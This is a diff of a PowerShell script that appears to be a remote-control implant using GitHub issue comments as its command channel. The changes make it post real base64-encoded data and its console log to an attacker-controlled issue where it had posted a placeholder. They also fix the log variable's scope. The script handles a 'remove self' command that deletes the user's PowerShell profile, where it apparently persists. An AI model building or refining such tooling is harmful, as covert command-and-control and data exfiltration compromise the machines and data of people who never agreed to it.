@@ -34,10 +34,9 @@ function Send-Message
             Write-Console -Message ("body is currently set to " + $body)
             [string]$encodedBody = [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes($body))
             Write-Console -Message ("encodedBody is currently set to " + $encodedBody)
-            [string]$mergedBody = "[" + [string]$commandID + "]:" + [string]$encodedBody
+            $mergedBody = "[" + [string]$commandID + "]:" + [string]$encodedBody
             Write-Console -Message ("Merged body is " + $mergedBody)
-            $upVar = "Testing 123"
-            New-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue -Body $upVar
+            New-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue -Body $mergedBody
         }           
     }
     catch
@@ -67,7 +66,7 @@ function Write-Console
             Write-Host ("DEBUG: " + $message)
         }
 
-        $consoleLog = $consoleLog + [string]$timeStamp +  ": " + [string]$message + "`n"
+        $script:consoleLog = $script:consoleLog + [string]$timeStamp +  ": " + [string]$message + "`n"
 	}
 	catch
 	{
@@ -460,7 +459,7 @@ function Start-LoopMode
                     Write-Console -Message ("Remove self command received. Deleting...")
                     Remove-Item ($env:USERPROFILE + "\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1")
                     Write-Console -Message ("Deleted. Uploading console and exiting.")
-                    Send-Message -CommandID 2 -Body ($consoleLog)
+                    Send-Message -CommandID 2 -Body ($script:consoleLog)
                     Exit
                 }
             }
@@ -490,7 +489,7 @@ function Start-LoopMode
             If($uploadConsole)
             {
                 Write-Console -Message ("Configuration is set to upload the console log. Uploading...")
-                Send-Message -CommandID 2 -Body ($consoleLog)
+                Send-Message -CommandID 2 -Body ($script:consoleLog)
                 Write-Console -Message ("Console log upload complete.")
             }
         }
